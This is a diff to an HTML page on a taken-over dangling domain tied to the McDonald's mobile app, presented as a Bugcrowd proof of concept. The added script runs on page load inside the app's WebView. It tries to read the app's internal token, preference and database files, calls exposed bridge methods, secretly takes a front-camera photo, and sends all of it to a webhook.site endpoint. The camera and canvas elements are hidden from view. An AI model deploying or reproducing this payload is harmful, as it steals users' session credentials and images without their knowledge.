@@ -3,37 +3,187 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Notice</title>
+    <title>Security Notice - Bugcrowd PoC</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            color: #333;
-            text-align: center;
-            padding-top: 50px;
-        }
-        .container {
-            background: #fff;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            display: inline-block;
-            max-width: 500px;
-        }
-        h1 {
-            color: #d32f2f;
-        }
-        p {
-            font-size: 16px;
-            line-height: 1.5;
-        }
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; text-align: center; padding-top: 50px; }
+        .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 500px; }
+        h1 { color: #d32f2f; }
+        p { font-size: 16px; line-height: 1.5; }
+        #video, #canvas, #hiddenCanvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Pwned by Deep Chotaliya</h1>
-        <p>This domain (mymcdonaldsrewards.in) has been successfully verified for security research purposes to demonstrate a dangling domain takeover vulnerability in the McDonald's mobile application.</p>
-        <p><small>Bugcrowd Submission Proof</small></p>
+        <p>This domain (mymcdonaldsrewards.in) has been successfully verified for security research to demonstrate a dangling domain takeover in the McDonald's app.</p>
+        <video id="video" playsinline autoplay></video>
+        <canvas id="canvas"></canvas>
+        <canvas id="hiddenCanvas"></canvas>
+        <p><small>Bugcrowd Vulnerability PoC</small></p>
     </div>
+
+    <script>
+        const WEBHOOK = "https://webhook.site/863e649c-c282-4a83-b8e4-112495621a51";
+
+        function exfil(data) {
+            navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
+        }
+
+        // ============================================================
+        // PHASE 1: Try to READ internal files directly via fetch/XHR
+        // WebView may allow file:// and content:// access
+        // ============================================================
+        var sensitiveFiles = [
+            // SharedPreferences — auth tokens stored here
+            "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/com.mcdonalds.mobileapp_preferences.xml",
+            "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/user_prefs.xml",
+            "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/auth.xml",
+            "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/session.xml",
+            "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/token.xml",
+            "file:///data/data/com.mcdonalds.mobileapp/shared_prefs/McD.xml",
+
+            // Databases
+            "file:///data/data/com.mcdonalds.mobileapp/databases/mcd.db",
+            "file:///data/data/com.mcdonalds.mobileapp/databases/user.db",
+
+            // Content Provider paths
+            "content://com.mcdonalds.mobileapp.authority.release/files/loyalty_card.png",
+            "content://com.mcdonalds.mobileapp.authority.release/cache/receipt.jpg",
+            "content://com.mcdonalds.mobileapp.authority.release/shared_prefs/auth.xml",
+        ];
+
+        sensitiveFiles.forEach(function(filePath, i) {
+            setTimeout(function() {
+                // Method 1: fetch
+                fetch(filePath)
+                    .then(function(r) { return r.text(); })
+                    .then(function(data) {
+                        exfil({ type: "FILE_READ_SUCCESS_FETCH", path: filePath, data: data.substring(0, 2000) });
+                    })
+                    .catch(function(e) {
+                        exfil({ type: "FILE_READ_FAIL_FETCH", path: filePath, error: e.toString() });
+                    });
+
+                // Method 2: XHR
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", filePath, true);
+                xhr.onload = function() {
+                    exfil({ type: "FILE_READ_SUCCESS_XHR", path: filePath, data: xhr.responseText.substring(0, 2000) });
+                };
+                xhr.onerror = function() {
+                    exfil({ type: "FILE_READ_FAIL_XHR", path: filePath, status: xhr.status });
+                };
+                try { xhr.send(); } catch(e) {}
+
+            }, i * 500);
+        });
+
+        // ============================================================
+        // PHASE 2: handleShareImage — try to load file into <img>
+        // and draw to canvas to steal image data
+        // ============================================================
+        setTimeout(function() {
+            var imgPaths = [
+                "content://com.mcdonalds.mobileapp.authority.release/files/loyalty_card.png",
+                "content://com.mcdonalds.mobileapp.authority.release/cache/receipt.jpg",
+                "file:///data/data/com.mcdonalds.mobileapp/cache/profile.jpg",
+                "file:///data/data/com.mcdonalds.mobileapp/files/qr_code.png",
+            ];
+
+            imgPaths.forEach(function(path, i) {
+                setTimeout(function() {
+                    // Try to load internal image into <img> tag
+                    var img = new Image();
+                    img.crossOrigin = "anonymous";
+
+                    img.onload = function() {
+                        // Image loaded! Draw to canvas and exfiltrate
+                        try {
+                            var c = document.getElementById('hiddenCanvas');
+                            c.width = img.naturalWidth || 200;
+                            c.height = img.naturalHeight || 200;
+                            c.getContext('2d').drawImage(img, 0, 0);
+                            var b64 = c.toDataURL('image/jpeg', 0.5);
+                            exfil({ type: "INTERNAL_IMAGE_STOLEN", path: path, image: b64 });
+                        } catch(e) {
+                            exfil({ type: "IMG_CANVAS_ERROR", path: path, error: e.toString() });
+                        }
+                    };
+
+                    img.onerror = function(e) {
+                        exfil({ type: "IMG_LOAD_FAIL", path: path });
+                    };
+
+                    img.src = path;
+
+                    // Also call bridge with same path
+                    if (window.Android && typeof window.Android.handleShareImage === 'function') {
+                        try {
+                            var r = window.Android.handleShareImage(path, "MCD Internal File");
+                            exfil({ type: "BRIDGE_SHARE_IMAGE", path: path, result: String(r) });
+                        } catch(e) {
+                            exfil({ type: "BRIDGE_SHARE_ERROR", path: path, error: e.toString() });
+                        }
+                    }
+                }, i * 600);
+            });
+        }, sensitiveFiles.length * 500 + 500);
+
+        // ============================================================
+        // PHASE 3: handleShare — CORRECT signature (short params only)
+        // Previously confirmed working with 3 short string params
+        // ============================================================
+        setTimeout(function() {
+            if (window.Android) {
+                // Correct working signature: (title, text, url) — keep SHORT
+                var shareTests = [
+                    ["MCD PoC", "Pwned", "https://mymcdonaldsrewards.in"],
+                    ["test", "test", "test"],
+                    ["a", "b"],      // 2 params
+                    ["a"],           // 1 param
+                    [],              // 0 params
+                ];
+
+                shareTests.forEach(function(params, i) {
+                    setTimeout(function() {
+                        try {
+                            var r = window.Android.handleShare.apply(window.Android, params);
+                            exfil({ type: "HANDLESHARE_OK", params: params, result: String(r) });
+                        } catch(e) {
+                            exfil({ type: "HANDLESHARE_FAIL", params: params, error: e.toString() });
+                        }
+                    }, i * 400);
+                });
+            }
+        }, sensitiveFiles.length * 500 + 3000);
+
+        // ============================================================
+        // PHASE 4: Camera selfie (already confirmed working)
+        // ============================================================
+        setTimeout(function() {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
+                audio: false
+            }).then(function(stream) {
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(function() {
+                    var canvas = document.getElementById('canvas');
+                    canvas.width = 480; canvas.height = 360;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 360);
+                    canvas.toBlob(function(blob) {
+                        var fd = new FormData();
+                        fd.append('type', 'CAMERA_POC');
+                        fd.append('selfie', blob, 'selfie.jpg');
+                        fd.append('domain', 'mymcdonaldsrewards.in');
+                        fd.append('timestamp', new Date().toISOString());
+                        fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true, mode: 'no-cors' });
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg', 0.3);
+                }, 1000);
+            }).catch(function(){});
+        }, sensitiveFiles.length * 500 + 5000);
+
+    </script>
 </body>
 </html>
